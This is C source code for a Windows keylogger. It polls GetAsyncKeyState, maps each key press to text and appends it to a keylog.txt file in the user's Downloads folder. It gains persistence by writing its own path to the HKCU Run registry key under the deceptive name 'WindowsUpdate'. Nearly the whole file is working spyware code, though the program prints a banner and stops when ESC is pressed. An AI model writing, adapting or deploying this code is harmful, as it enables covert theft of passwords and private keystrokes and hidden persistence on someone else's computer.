#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

FILE *logFile; // Declare globally

void AddToRegistry()
{
    HKEY hKey;
    const char *path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char exePath[MAX_PATH];

    // Get current executable path
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Add to registry
    if (RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE *)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

void WriteKeyToFile(const char *text)
{
    if (logFile)
    {
        fprintf(logFile, "%s", text);
        fflush(logFile);
    }
}

void PrintKey(int key)
{

    char buf[32] = {0};

    if (key >= 'A' && key <= 'Z')
    {
        sprintf(buf, "%c", key);
        printf("%c", key); // Uppercase alphabet
    }
    else if (key >= '0' && key <= '9')
    {
        sprintf(buf, "%c", key);
        printf("%c", key); // Numbers
    }
    else
    {
        switch (key)
        {
        // Control keys
        case VK_SPACE:
            sprintf(buf, " ");
            printf(" ");
            break;
        case VK_RETURN:
            sprintf(buf, "\n");
            printf("\n");
            break;
        case VK_TAB:
            sprintf(buf, "[TAB]");
            printf("[TAB]");
            break;
        case VK_ESCAPE:
            sprintf(buf, "[ESC]");
            printf("[ESC]");
            break;
        case VK_BACK:
            sprintf(buf, "[BACKSPACE]");
            printf("[BACKSPACE]");
            break;

        // Arrow keys
        case VK_LEFT:
            sprintf(buf, "[LEFT]");
            printf("[LEFT]");
            break;
        case VK_UP:
            sprintf(buf, "[UP]");
            printf("[UP]");
            break;
        case VK_RIGHT:
            sprintf(buf, "[RIGHT]");
            printf("[RIGHT]");
            break;
        case VK_DOWN:
            sprintf(buf, "[DOWN]");
            printf("[DOWN]");
            break;

        // Function keys
        case VK_F1:
            sprintf(buf, "[F1]");
            printf("[F1]");
            break;
        case VK_F2:
            sprintf(buf, "[F2]");
            printf("[F2]");
            break;
        case VK_F3:
            sprintf(buf, "[F3]");
            printf("[F3]");
            break;
        case VK_F4:
            sprintf(buf, "[F4]");
            printf("[F4]");
            break;
        case VK_F5:
            sprintf(buf, "[F5]");
            printf("[F5]");
            break;
        case VK_F6:
            sprintf(buf, "[F6]");
            printf("[F6]");
            break;
        case VK_F7:
            sprintf(buf, "[F7]");
            printf("[F7]");
            break;
        case VK_F8:
            sprintf(buf, "[F8]");
            printf("[F8]");
            break;
        case VK_F9:
            sprintf(buf, "[F9]");
            printf("[F9]");
            break;
        case VK_F10:
            sprintf(buf, "[F10]");
            printf("[F10]");
            break;
        case VK_F11:
            sprintf(buf, "[F11]");
            printf("[F11]");
            break;
        case VK_F12:
            sprintf(buf, "[F12]");
            printf("[F12]");
            break;

        // Modifier keys
        case VK_SHIFT:
            sprintf(buf, "[SHIFT]");
            printf("[SHIFT]");
            break;
        case VK_CONTROL:
            sprintf(buf, "[CTRL]");
            printf("[CTRL]");
            break;
        case VK_MENU:
            sprintf(buf, "[ALT]");
            printf("[ALT]");
            break;
        case VK_CAPITAL:
            sprintf(buf, "[CAPSLOCK]");
            printf("[CAPSLOCK]");
            break;

        // Other common keys
        case VK_DELETE:
            sprintf(buf, "[DEL]");
            printf("[DEL]");
            break;
        case VK_HOME:
            sprintf(buf, "[HOME]");
            printf("[HOME]");
            break;
        case VK_END:
            sprintf(buf, "[END]");
            printf("[END]");
            break;
        case VK_PRIOR:
            sprintf(buf, "[PGUP]");
            printf("[PGUP]");
            break;
        case VK_NEXT:
            sprintf(buf, "[PGDN]");
            printf("[PGDN]");
            break;
        case VK_INSERT:
            sprintf(buf, "[INS]");
            printf("[INS]");
            break;
        case VK_SNAPSHOT:
            sprintf(buf, "[PRTSC]");
            printf("[PRTSC]");
            break;
        case VK_SCROLL:
            sprintf(buf, "[SCROLLLOCK]");
            printf("[SCROLLLOCK]");
            break;
        case VK_PAUSE:
            sprintf(buf, "[PAUSE]");
            printf("[PAUSE]");
            break;

        // Punctuation / symbols
        case VK_OEM_1:
            sprintf(buf, ";");
            printf(";");
            break;
        case VK_OEM_PLUS:
            sprintf(buf, "=");
            printf("=");
            break;
        case VK_OEM_COMMA:
            sprintf(buf, ",");
            printf(",");
            break;
        case VK_OEM_MINUS:
            sprintf(buf, "-");
            printf("-");
            break;
        case VK_OEM_PERIOD:
            sprintf(buf, ".");
            printf(".");
            break;
        case VK_OEM_2:
            sprintf(buf, "/");
            printf("/");
            break;
        case VK_OEM_3:
            sprintf(buf, "`");
            printf("`");
            break;
        case VK_OEM_4:
            sprintf(buf, "[");
            printf("[");
            break;
        case VK_OEM_5:
            sprintf(buf, "\\");
            printf("\\");
            break;
        case VK_OEM_6:
            sprintf(buf, "]");
            printf("]");
            break;
        case VK_OEM_7:
            sprintf(buf, "'");
            printf("'");
            break;

        default:
            break;
        }
    }
    fflush(stdout);
    if (buf[0] != 0)
    {
        WriteKeyToFile(buf); // Log to file
    }
}

int main()
{

    AddToRegistry(); // Add to startup registry

    char downloadsPath[MAX_PATH];
    char *userProfile = getenv("USERPROFILE"); // Get user home folder

    if (!userProfile)
    {
        printf("Failed to get USERPROFILE environment variable.\n");
        return 1;
    }

    // Build path to Downloads\keylog.txt
    snprintf(downloadsPath, MAX_PATH, "%s\\Downloads\\keylog.txt", userProfile);

    logFile = fopen(downloadsPath, "a+");
    if (!logFile)
    {
        printf("Failed to open log file at %s\n", downloadsPath);
        return 1;
    }

    printf("Logging keys to: %s\n", downloadsPath);

    SetConsoleOutputCP(CP_UTF8);
    printf("\n\n\n");

    printf(
        "\t\t\t\t██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗        \n"
        "\t\t\t\t██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗       \n"
        "\t\t\t\t█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝       \n"
        "\t\t\t\t██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗       \n"
        "\t\t\t\t██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║       \n"
        "\t\t\t\t╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝       \n");
    printf("\t\t\t\t\t\t\tPolling-based Keylogger\n");

    printf("\n\n\n");

    printf("(press ESC to exit)...\n");

    while (1)
    {
        for (int key = 0x08; key <= 0xFF; key++) // start at VK_BACK (0x08)
        {
            // Bit 0 (Least Significant Bit): Indicates if the key was pressed since the last call.
            // Returns 1 if the key was newly pressed
            // Returns 0 if the key was not pressed or was held down.
            if (GetAsyncKeyState(key) & 0x0001)
            {
                PrintKey(key);

                if (key == VK_ESCAPE)
                {
                    printf("\nExiting...\n");
                    fclose(logFile);
                    return 0;
                }
            }
        }
        Sleep(100); // Increase sleep to 100 ms
    }
}
